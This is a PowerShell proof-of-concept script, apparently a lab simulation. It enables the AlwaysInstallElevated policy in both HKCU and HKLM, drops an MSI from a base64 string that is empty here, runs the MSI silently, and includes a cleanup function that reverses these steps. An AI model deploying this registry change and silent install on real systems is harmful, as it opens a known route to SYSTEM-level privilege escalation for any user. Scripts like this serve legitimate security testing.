# Automating script in order to perform privilege escalation


# Check for admin privileges
function Test-Admin {

    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal( [Security.Principal.WindowsIdentity]::GetCurrent())
    if($currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator) -ne $true) {
        Write-Warning "Please Run This Script as an Administrator!"
        Break
    }
}

function Invoke-MsiInstaller
{

    Test-Admin

    $MsiPath = 'C:\Users\Public\WhiteHatInstallerCMD.msi'

    # Drop WhiteHatInstaller.msi into C:\Users\Public

    $b64 = ''
    $bytes = [Convert]::FromBase64String($b64)
    [IO.File]::WriteAllBytes($MsiPath, $bytes)
    Write-Host -ForegroundColor Green "[+] Write: C:\Users\Public\WhiteHatInstallerCMD.msi"


    Write-Host -ForegroundColor Green "[+] Creating the registry keys"

    Start-Sleep 3

    New-Item -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer'
    New-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer'
    New-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -PropertyType Dword -Value 1 -Force 
    New-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated' -PropertyType Dword -Value 1 -Force

    Write-Host -ForegroundColor Green "[+] Operation completed successfully"


    Write-Host -ForegroundColor Green "[+] Executing the installer"

    #Start-Sleep 5


    Invoke-Expression -Command "msiexec.exe /quiet /qn /i C:\Users\public\WhiteHatInstallerCMD.msi"


}

function Clean-MsiInstaller
{
	
    Test-Admin

    Write-Host -ForegroundColor Green "[+] Removing the registry keys"
    if(Test-Path -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer')
    {
        Remove-ItemProperty -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated'
        Remove-Item -Path 'HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer' 
    }
    if(Test-Path -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer')
    {
        Remove-ItemProperty -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' -Name 'AlwaysInstallElevated'
        Remove-Item -Path 'HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer' 
    }

    Write-Host -ForegroundColor Green "[+] Removing the poc file"

	   if(Test-Path -Path C:\users\public\WhiteHatInstallerCMD.msi) 
    {
        Remove-Item -Path C:\users\public\WhiteHatInstallerCMD.msi
    }

    Write-Host -ForegroundColor Green "[+] Done!"	

}

